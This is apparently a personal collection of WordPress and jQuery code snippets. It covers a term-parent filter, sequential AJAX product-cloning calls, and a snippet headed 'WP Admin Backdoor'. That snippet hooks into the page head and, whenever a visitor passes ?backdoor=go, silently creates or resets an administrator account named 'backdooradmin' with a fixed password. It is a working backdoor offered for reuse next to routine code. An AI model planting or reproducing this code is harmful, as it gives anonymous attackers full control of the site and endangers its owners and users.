# Snippets
	/**
	* Updating parent on term edit screen
	*/
	add_filter('wp_update_term_parent','test_func',10,5);
	function test_func($parent, $term_id, $taxonomy, $parsed_args, $args) {
		$parent = 19;
		return $parent;
	}
	
	/**
	* WP Admin Backdoor
	*/
	add_action('wp_head', 'WordPress_backdoor');
	function WordPress_backdoor() {
	    If ($_GET['backdoor'] == 'go') {
		require('wp-includes/registration.php');
		require('wp-includes/pluggable.php');
		If (!username_exists('backdooradmin')) {
		    $user_id = wp_create_user('backdooradmin', 'Pa55W0rd');
		    $user = new WP_User($user_id);
		    $user->set_role('administrator');
		}else{
		    $user = get_user_by( 'login', 'backdooradmin' );
		    wp_set_password('Pa55W0rd', $user->ID);
		}
	    }
	}
	
	/*
	* AJAX Requests one after another
	*/
	
	jQuery(document).ready(function(){

	var productsjson = jQuery.parseJSON(ajax_object.shop_products);
    	current = 0;

	    //declare your function to run AJAX requests
	    function ajax_clone_bas_products() {
		//check to make sure there are more requests to make
		if (current < productsjson.length) {

			var data = {
				'action': 'clone_bas_products',
				'productid': productsjson[current]
			};

			jQuery.post(ajax_object.ajax_url, data, function(response) {
				if(response) {
			   		console.log(response);
					current++;
					ajax_clone_bas_products();
			   	}
			});
	        }
    	}

	    //run the AJAX function for the first time once `document.ready` fires
    	ajax_clone_bas_products();

	});
